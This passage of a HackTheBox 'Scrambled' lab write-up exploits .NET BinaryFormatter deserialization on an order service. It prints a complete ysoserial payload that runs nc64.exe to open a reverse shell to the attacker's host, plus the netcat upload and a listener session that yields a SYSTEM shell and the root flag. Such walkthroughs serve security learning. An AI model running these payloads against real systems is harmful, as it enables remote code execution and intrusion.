they are both .NET binaries we can use ILSpy to see the decompiled code

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image7.png)

we can find the username ‘scrmdev’ that works with any password you specify

and this app is about the port (4411) we found earlier it includes getting and uploading Orders

so when we run the binary we can see the same stuff that was on the website

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image8.png)

and in the website they said to enable debug logging so let’s do it and authenticate

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image9.png)

we can see the orders as well as create a new order

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image10.png)

finally in the log file we can see stuff like this 

```bash
11/18/2025 8:04:04 AM	Developer logon bypass used
11/18/2025 8:04:04 AM	Getting order list from server
11/18/2025 8:04:04 AM	Getting orders from server
11/18/2025 8:04:04 AM	Connecting to server
11/18/2025 8:04:05 AM	Received from server: SCRAMBLECORP_ORDERS_V1.0.3;
11/18/2025 8:04:05 AM	Parsing server response
11/18/2025 8:04:05 AM	Response type = Banner
11/18/2025 8:04:05 AM	Sending data to server: LIST_ORDERS;
11/18/2025 8:04:05 AM	Getting response from server
11/18/2025 8:04:05 AM	Received from server: SUCCESS;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==|AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
11/18/2025 8:04:05 AM	Parsing server response
11/18/2025 8:04:05 AM	Response type = Success
11/18/2025 8:04:05 AM	Splitting and parsing sales orders
11/18/2025 8:04:05 AM	Found 2 sales orders in server response
11/18/2025 8:04:05 AM	Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzYwMQYEAAAAC1NDUk1RVTkxODcyBgUAAAAGSiBIYWxsCQYAAAAAQBHK4mnaCAAAAAAAIHJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
11/18/2025 8:04:05 AM	Binary formatter init successful
11/18/2025 8:04:05 AM	Deserialization successful
11/18/2025 8:04:05 AM	Deserializing single sales order from base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAKU0NSTVNPMzc0OQYEAAAAC1NDUk1RVTkyMjEwBgUAAAAJUyBKZW5raW5zCQYAAAAAAJ07rZbaCAAAAAAAUJJABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
11/18/2025 8:04:05 AM	Binary formatter init successful
11/18/2025 8:04:05 AM	Deserialization successful
11/18/2025 8:04:05 AM	Finished deserializing all sales orders
11/18/2025 8:04:54 AM	Uploading new order with reference jnjnj
11/18/2025 8:04:54 AM	Binary formatter init successful
11/18/2025 8:04:54 AM	Order serialized to base64: AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAFam5qbmoGBAAAAAIxMQYFAAAACEUgSG9va2VyCQYAAAAAgJ6/xyfeCAAAAAAAXJFABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
11/18/2025 8:04:54 AM	Connecting to server
11/18/2025 8:04:54 AM	Received from server: SCRAMBLECORP_ORDERS_V1.0.3;
11/18/2025 8:04:54 AM	Parsing server response
11/18/2025 8:04:54 AM	Response type = Banner
11/18/2025 8:04:54 AM	Sending data to server: UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAEJTY3JhbWJsZUxpYiwgVmVyc2lvbj0xLjAuMy4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPW51bGwFAQAAABZTY3JhbWJsZUxpYi5TYWxlc09yZGVyBwAAAAtfSXNDb21wbGV0ZRBfUmVmZXJlbmNlTnVtYmVyD19RdW90ZVJlZmVyZW5jZQlfU2FsZXNSZXALX09yZGVySXRlbXMIX0R1ZURhdGUKX1RvdGFsQ29zdAABAQEDAAABf1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3RgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0NBgIAAAAABgMAAAAFam5qbmoGBAAAAAIxMQYFAAAACEUgSG9va2VyCQYAAAAAgJ6/xyfeCAAAAAAAXJFABAYAAAB/U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQMAAAAGX2l0ZW1zBV9zaXplCF92ZXJzaW9uBgAACAgJBwAAAAAAAAAAAAAAEQcAAAAAAAAACw==
11/18/2025 8:04:54 AM	Getting response from server
11/18/2025 8:04:54 AM	Received from server: SUCCESS;
11/18/2025 8:04:54 AM	Parsing server response
11/18/2025 8:04:54 AM	Response type = Success
11/18/2025 8:04:54 AM	Upload successful
```

this is a **classic .NET BinaryFormatter deserialization vulnerability**. The application is deserializing Base64-encoded objects sent from the server using **`BinaryFormatter.Deserialize()`**, which is a well-known unsafe deserialization method that allows remote code execution.
so we can use a tool like `ysoserial` and craft a malicious payload so we can upload to the service

```bash
ysoserial.exe -f BinaryFormatter -g AxHostState -o base64 -c "C:\\programdata\\nc64.exe 10.10.14.100 4444 -e cmd.exe"      AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMMDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA5QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFxwcm9ncmFtZGF0YVxcbmM2NC5leGUgMTAuMTAuMTQuMTAwIDQ0NDQgLWUgY21kLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw== 
```

now we can uplaod this to the service

and start to a listener to get the connection

```bash
└─$ nc 10.129.43.178 4411 
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMMDAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA5QU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFxwcm9ncmFtZGF0YVxcbmM2NC5leGUgMTAuMTAuMTQuMTAwIDQ0NDQgLWUgY21kLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==
ERROR_GENERAL;Error deserializing sales order: Unable to cast object of type 'State' to type 'ScrambleLib.SalesOrder'.
```

and finally

```bash
└─$ rlwrap nc -lnvp 4444                                                                
listening on [any] 4444 ...
connect to [10.10.14.100] from (UNKNOWN) [10.129.43.178] 57265
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd c:\users\administrator\desktop
cd c:\users\administrator\desktop

c:\Users\administrator\Desktop>ls
ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

c:\Users\administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of c:\Users\administrator\Desktop

29/05/2022  20:02    <DIR>          .
29/05/2022  20:02    <DIR>          ..
18/11/2025  13:21                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  15,983,038,464 bytes free

c:\Users\administrator\Desktop>type root.txt
type root.txt
f6c006564d165783ba2e97d62c098481
```

DONE!